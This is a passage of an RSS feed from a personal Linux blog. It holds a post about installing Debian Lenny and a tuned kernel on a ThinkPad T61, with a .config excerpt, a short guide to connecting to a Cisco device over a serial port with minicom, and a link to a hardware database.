+<p>Without surprise, the keyboard and the trackpoint are just excellent. I also aprreciate some features like the hardware encryption of the hard drive, which also benefits from the active protection (head parking in case of shock to protect the data).</p>
+<p>The laptop built and design are not as nice and polished as the Sony ones, but it is certainly solid.</p>
+<p>After I took it just out of the box, I thought I would give a look to the pre-installed Windows Vista system. But the first startup appeared to be so long that I quickly stopped it in the middle of its process, inserted a fresh Debian Lenny 64 bits CD and went for a set up.</p>
+<p>I worked pretty well out of the box. Like usual, I had to download the Intel Wifi firmware and the proprietary nvidia driver to use all the features of my Quadro NVS  140M graphic card.</p>
+<p>More annoying, the active protection is not supported by default by the kernel.</p>
+<p>I also have a problem with hibernation. Suspend to RAM works well, but resuming after suspend to disk always leave me on a blank screen. I guess this is related to the graphic driver, but so far the workaround that I found from other users don&#8217;t work for me.</p>
+<p>Other things, including the fingerprint reader, work pretty well.</p>
+<p>There are a number of guides from the <a title="ThinkWiki" href="http://www.thinkwiki.org/wiki/ThinkWiki" target="_blank">ThinkWiki</a> website that helped me a lot. Among them :</p>
+<p><a href="http://www.thinkwiki.org/wiki/Installing_Debian_Lenny_on_a_ThinkPad_T61" target="_blank">http://www.thinkwiki.org/wiki/Installing_Debian_Lenny_on_a_ThinkPad_T61</a></p>
+<p>Set up the active protection (patch and recompile the kernel :( ) :</p>
+<p><a href="http://www.thinkwiki.org/wiki/Installing_Debian_Lenny_on_a_ThinkPad_T60#hdapsd">http://www.thinkwiki.org/wiki/Installing_Debian_Lenny_on_a_ThinkPad_T60#hdapsd </a></p>
+<p>Get the fingerprint reader work :</p>
+<p><a href="https://wiki.ubuntu.com/ThinkFinger" target="_blank">https://wiki.ubuntu.com/ThinkFinger </a></p>
+<p>However, after a few days, I realized that I was not satisfied by the responsiveness of  the laptop, and especially the way it managed multiprocessing. I also wanted to use the active protection for my hard drive.</p>
+<p>I decided to compile my own kernel, more optimized than the generic AMD 64 one provided by Debian.</p>
+<p>Here is an excerpt from my .config file activating some features for a Core 2 Duo Intel processor &#8211; this apply to the latest version of Linux today, 2.6.24-2 :</p>
+<pre lang="txt">
+#
+# Processor type and features
+#
+CONFIG_TICK_ONESHOT=y
+CONFIG_NO_HZ=y
+CONFIG_HIGH_RES_TIMERS=y
+CONFIG_GENERIC_CLOCKEVENTS_BUILD=y
+CONFIG_SMP=y
+CONFIG_X86_PC=y
+CONFIG_MCORE2=y
+CONFIG_X86_L1_CACHE_BYTES=64
+CONFIG_X86_INTERNODE_CACHE_BYTES=64
+CONFIG_X86_CMPXCHG=y
+CONFIG_X86_L1_CACHE_SHIFT=6
+CONFIG_X86_GOOD_APIC=y
+CONFIG_X86_INTEL_USERCOPY=y
+CONFIG_X86_USE_PPRO_CHECKSUM=y
+CONFIG_X86_TSC=y
+CONFIG_X86_MINIMUM_CPU_FAMILY=64
+CONFIG_HPET_TIMER=y
+CONFIG_HPET_EMULATE_RTC=y
+CONFIG_GART_IOMMU=y
+CONFIG_CALGARY_IOMMU=y
+CONFIG_CALGARY_IOMMU_ENABLED_BY_DEFAULT=y
+CONFIG_SWIOTLB=y
+CONFIG_NR_CPUS=8
+CONFIG_SCHED_SMT=y
+CONFIG_SCHED_MC=y
+CONFIG_PREEMPT_VOLUNTARY=y
+CONFIG_PREEMPT_BKL=y
+CONFIG_X86_LOCAL_APIC=y
+CONFIG_X86_IO_APIC=y
+CONFIG_X86_MCE=y
+CONFIG_X86_MCE_INTEL=y
+CONFIG_X86_MCE_AMD=y
+CONFIG_MICROCODE=m
+CONFIG_MICROCODE_OLD_INTERFACE=y
+CONFIG_X86_MSR=m
+CONFIG_X86_CPUID=m
+CONFIG_NUMA=y
+CONFIG_K8_NUMA=y
+CONFIG_X86_64_ACPI_NUMA=y
+CONFIG_NODES_SHIFT=6
+CONFIG_ARCH_DISCONTIGMEM_ENABLE=y
+CONFIG_ARCH_DISCONTIGMEM_DEFAULT=y
+CONFIG_ARCH_SPARSEMEM_ENABLE=y
+CONFIG_SELECT_MEMORY_MODEL=y
+CONFIG_DISCONTIGMEM_MANUAL=y
+CONFIG_DISCONTIGMEM=y
+CONFIG_FLAT_NODE_MEM_MAP=y
+CONFIG_NEED_MULTIPLE_NODES=y
+CONFIG_SPARSEMEM_VMEMMAP_ENABLE=y
+CONFIG_SPLIT_PTLOCK_CPUS=4
+CONFIG_MIGRATION=y
+CONFIG_RESOURCES_64BIT=y
+CONFIG_ZONE_DMA_FLAG=1
+CONFIG_BOUNCE=y
+CONFIG_VIRT_TO_BUS=y
+CONFIG_MTRR=y
+CONFIG_SECCOMP=y
+CONFIG_CC_STACKPROTECTOR=y
+CONFIG_HZ_1000=y
+CONFIG_HZ=1000
+CONFIG_KEXEC=y
+CONFIG_PHYSICAL_START=0x200000
+CONFIG_PHYSICAL_ALIGN=0x200000
+CONFIG_HOTPLUG_CPU=y
+CONFIG_ARCH_ENABLE_MEMORY_HOTPLUG=y
+CONFIG_HAVE_ARCH_EARLY_PFN_TO_NID=y
+CONFIG_OUT_OF_LINE_PFN_TO_PAGE=y
+</pre>
+<p>The important differences with the standard kernel are :</p>
+<ul>
+<li> the timer frequency set to &#8220;1000 Hz&#8221;,</li>
+<li>processor familly to &#8220;Core 2&#8221;</li>
+<li>preemption model to &#8220;Voluntary&#8221;</li>
+</ul>
+<p>I am seeing now better performance in threading and global responsiveness &#8211; including, believe it or not, with the compiz effect, what I didn&#8217;t expect at all.</p>
+<p>At the end, I just have hibernation not working : it is nice to see how good the support of Debian Lenny is, thought the hardware is pretty recent. Things are really improving quickly.</p>
+<p>If you have some issue installing Linux on your Thinpad,  post your problem here. I will be happy to help you as much as I can.</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2008/02/21/my-new-toy-thinkpad-t61.html/feed</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>How to connect to a Cisco device using the serial port on Linux</title>
+		<link>/blog-archive/2007/11/13/how-to-connect-to-a-cisco-device-using-the-serial-port-on-linux.html</link>
+		<comments>/blog-archive/2007/11/13/how-to-connect-to-a-cisco-device-using-the-serial-port-on-linux.html#comments</comments>
+		<pubDate>Tue, 13 Nov 2007 11:41:35 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Defense]]></category>
+		<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Cisco]]></category>
+		<category><![CDATA[Debian]]></category>
+		<category><![CDATA[Minicom]]></category>
+		<category><![CDATA[Pix]]></category>
+		<category><![CDATA[serial port]]></category>
+		<category><![CDATA[Ubuntu]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=84</guid>
+		<description><![CDATA[Using the serial port is still necessary to manage some devices, when it is reseted to factory defaults. It could be also a security choice&#8230; Nowadays many computers &#8211; and especially laptops don&#8217;t have anymore a built-in serial port. Not a problem, there are many cheap serial-usb converters like this. As an alternative to the...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2007/11/13/how-to-connect-to-a-cisco-device-using-the-serial-port-on-linux.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>Using the serial port is still necessary to manage some devices, when it is reseted to factory defaults. It could be also a security choice&#8230;</p>
+<p>Nowadays many computers &#8211; and especially laptops don&#8217;t have anymore a built-in serial port.  Not a problem, there are many cheap serial-usb converters <a href="http://www.usbgear.com/USB-1S1PQ.html" target="_blank">like this</a>.</p>
+<p>As an alternative to the Hyperterminal of Microsoft, there is Minicom on Linux.</p>
+<p>It is very easy to install and configure :</p>
+<pre>$ apt-get install minicom lrzsz</pre>
+<p>Before going further, you need to know what is the corresponding Linux device for the port where you plugged the router. As I used an usb adapter, my device was <strong>/dev/ttyUSB0</strong>. Otherwise, it will probably be one of the <strong>/dev/ttyS*</strong> devices.<br />
+Checking the <strong>dmesg</strong> output while you plug the device will give you the right device to use.</p>
+<p>Now start minicom this way to edit the configuration :</p>
+<pre>$ minicom -s</pre>
+<p>In the menu, select <em>Serial Port Configuration</em> and  :</p>
+<ul>
+<li> press A and update the serial port path with the one you found in dmesg</li>
+<li>press E and then C to change the speed to 9600</li>
+<li>press F to switch off the hardware flow control</li>
+<li>select <em>Save the configuration as&#8230;</em> and name it as, let&#8217;s say, &#8220;cisco&#8221;</li>
+</ul>
+<p>You should be able to connect right now. Next time, just start Minicom like this :</p>
+<pre>$ minicom cisco</pre>
+<p>That&#8217;s it !</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2007/11/13/how-to-connect-to-a-cisco-device-using-the-serial-port-on-linux.html/feed</wfw:commentRss>
+		<slash:comments>5</slash:comments>
+		</item>
+		<item>
+		<title>Hardware database for Linux</title>
+		<link>/blog-archive/2007/07/24/hardware-database-for-linux.html</link>
+		<pubDate>Tue, 24 Jul 2007 15:50:44 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=71</guid>
+		<description><![CDATA[A nice website : http://hardware4linux.info/ Whith the provided script, you can upload your hardware information there and quickly rate your experience with it (for each equipment it detected). I just did it for my laptop and will go on with my other machines. It will probably become an interesting database.]]></description>
+				<content:encoded><![CDATA[<p>A nice website :</p>
+<p><a title="Hardware4Linux" href="http://hardware4linux.info/ " target="_blank">http://hardware4linux.info/ </a></p>
+<p>Whith the provided script, you can upload your hardware information there and quickly rate your experience with it (for each equipment it detected).</p>
+<p>I just did it for my laptop and will go on with my other machines. It will probably become an interesting database.</p>
+]]></content:encoded>
+			</item>
+	</channel>
+</rss>
